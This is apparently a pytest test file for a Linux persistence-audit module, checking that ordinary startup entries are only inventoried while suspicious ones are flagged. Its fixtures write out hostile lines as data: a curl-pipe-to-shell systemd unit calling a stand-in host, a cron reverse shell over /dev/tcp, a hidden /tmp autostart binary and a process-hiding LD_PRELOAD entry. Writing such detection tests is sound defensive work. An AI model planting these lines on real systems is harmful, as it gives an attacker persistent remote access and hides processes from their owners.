"""Tests for linux_persistence_audit.

The module's value depends on not crying wolf: an ordinary systemd unit or
.bashrc must produce an inventory entry and nothing more, while fetch-and-execute
patterns, /tmp execution, and world-writable startup files must always escalate.
"""

import os
import sys
from pathlib import Path
from unittest.mock import patch

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

# These tests assert on POSIX file modes — the world-writable check is the whole
# point of one of them. Windows reports 0o666 for ordinary files, so the check
# fires on every fixture and "an ordinary unit produces only an inventory entry"
# becomes untestable. The module is Linux-only and can never run there anyway.
pytestmark = pytest.mark.skipif(
    os.name != "posix",
    reason="linux_persistence_audit is Linux-only and asserts on POSIX file modes",
)

from rescue.command import CommandResult
from rescue.models import Mode, Platform, Severity, SystemProfile
from rescue.registry import discover_modules


def _get_module():
    modules = discover_modules(Path(__file__).parent.parent / "modules")
    return next(m for m in modules if m.name == "linux_persistence_audit")


def _profile(platform=Platform.LINUX) -> SystemProfile:
    return SystemProfile(
        platform=platform,
        os_name="Ubuntu 24.04",
        os_version="6.8.0",
        architecture="x86_64",
        cpu_model="Test",
        cpu_cores=4,
        ram_bytes=8 * 1024**3,
    )


def _no_crontab(mod):
    def fake(args, **kwargs):
        return CommandResult(
            args=list(args), returncode=1, stdout="", stderr="",
            timed_out=False, error=None, duration_s=0.0, truncated=False,
        )

    return patch.object(sys.modules[type(mod).__module__], "run", side_effect=fake)


def _configure(mod, tmp_path):
    """Point every traversal root at a fixture tree, per the repo convention."""
    units = tmp_path / "units"
    autostart = tmp_path / "autostart"
    cron = tmp_path / "cron"
    for directory in (units, autostart, cron):
        directory.mkdir(parents=True, exist_ok=True)
    mod.system_unit_dirs = [str(units)]
    mod.user_unit_dirs = []
    mod.autostart_dirs = [str(autostart)]
    mod.cron_dirs = [str(cron)]
    mod.shell_rc_files = []
    mod.ld_preload_path = str(tmp_path / "absent-ld-preload")
    return units, autostart, cron


def _codes(result):
    return [f.code for f in result.findings]


def test_non_linux_is_unsupported():
    assert _get_module().check(_profile(Platform.DARWIN)).supported is False


def test_ordinary_unit_is_inventoried_and_not_flagged(tmp_path):
    mod = _get_module()
    units, _, _ = _configure(mod, tmp_path)
    (units / "syncthing.service").write_text(
        "[Unit]\nDescription=Syncthing\n[Service]\nExecStart=/usr/bin/syncthing\n"
    )
    with _no_crontab(mod):
        result = mod.check(_profile())
    codes = _codes(result)
    assert codes == ["security.linux_persistence_audit.inventory"]
    inventory = result.findings[0]
    assert inventory.severity is Severity.INFO
    assert inventory.data["count"] == 1


def test_curl_piped_to_shell_is_critical(tmp_path):
    mod = _get_module()
    units, _, _ = _configure(mod, tmp_path)
    (units / "evil.service").write_text(
        "[Service]\nExecStart=/bin/sh -c 'curl -s http://example.invalid/x | sh'\n"
    )
    with _no_crontab(mod):
        result = mod.check(_profile())
    finding = next(f for f in result.findings if f.code.endswith("suspicious_content"))
    assert finding.severity is Severity.CRITICAL


def test_reverse_shell_pattern_is_detected(tmp_path):
    mod = _get_module()
    _, _, cron = _configure(mod, tmp_path)
    (cron / "backdoor").write_text("* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    with _no_crontab(mod):
        result = mod.check(_profile())
    assert "security.linux_persistence_audit.suspicious_content" in _codes(result)


def test_execution_from_tmp_is_flagged(tmp_path):
    mod = _get_module()
    _, autostart, _ = _configure(mod, tmp_path)
    (autostart / "updater.desktop").write_text(
        "[Desktop Entry]\nType=Application\nExec=/tmp/.hidden/updater\n"
    )
    with _no_crontab(mod):
        result = mod.check(_profile())
    finding = next(f for f in result.findings if f.code.endswith("volatile_path_execution"))
    assert finding.severity is Severity.WARNING


def test_world_writable_startup_file_is_flagged(tmp_path):
    mod = _get_module()
    units, _, _ = _configure(mod, tmp_path)
    unit = units / "loose.service"
    unit.write_text("[Service]\nExecStart=/usr/bin/true\n")
    unit.chmod(0o666)
    with _no_crontab(mod):
        result = mod.check(_profile())
    assert "security.linux_persistence_audit.world_writable_unit" in _codes(result)


def test_ld_preload_content_is_critical(tmp_path):
    mod = _get_module()
    _configure(mod, tmp_path)
    preload = tmp_path / "ld.so.preload"
    preload.write_text("/usr/lib/libprocesshider.so\n")
    mod.ld_preload_path = str(preload)
    with _no_crontab(mod):
        result = mod.check(_profile())
    finding = next(f for f in result.findings if f.code.endswith("ld_preload_set"))
    assert finding.severity is Severity.CRITICAL
    assert "libprocesshider" in finding.data["content"]


def test_empty_ld_preload_is_not_reported(tmp_path):
    mod = _get_module()
    _configure(mod, tmp_path)
    preload = tmp_path / "ld.so.preload"
    preload.write_text("\n")
    mod.ld_preload_path = str(preload)
    with _no_crontab(mod):
        result = mod.check(_profile())
    assert "security.linux_persistence_audit.ld_preload_set" not in _codes(result)


def test_user_crontab_is_included(tmp_path):
    mod = _get_module()
    _configure(mod, tmp_path)

    def fake(args, **kwargs):
        return CommandResult(
            args=list(args), returncode=0,
            stdout="# comment\n0 * * * * /usr/local/bin/sync.sh\n",
            stderr="", timed_out=False, error=None, duration_s=0.0, truncated=False,
        )

    with patch.object(sys.modules[type(mod).__module__], "run", side_effect=fake):
        result = mod.check(_profile())
    inventory = next(f for f in result.findings if f.code.endswith("inventory"))
    assert any(e["kind"] == "user crontab" for e in inventory.data["entries"])


def test_fix_never_deletes_and_prefers_disabling(tmp_path):
    mod = _get_module()
    units, _, _ = _configure(mod, tmp_path)
    (units / "evil.service").write_text("[Service]\nExecStart=/bin/sh -c 'curl x | sh'\n")
    with _no_crontab(mod):
        check = mod.check(_profile())
    fix = mod.fix(check, Mode.CLI)
    assert fix.executed_mutations == []
    text = " ".join(a.description for a in fix.actions)
    assert "disable" in text
    assert "cannot be examined" in text
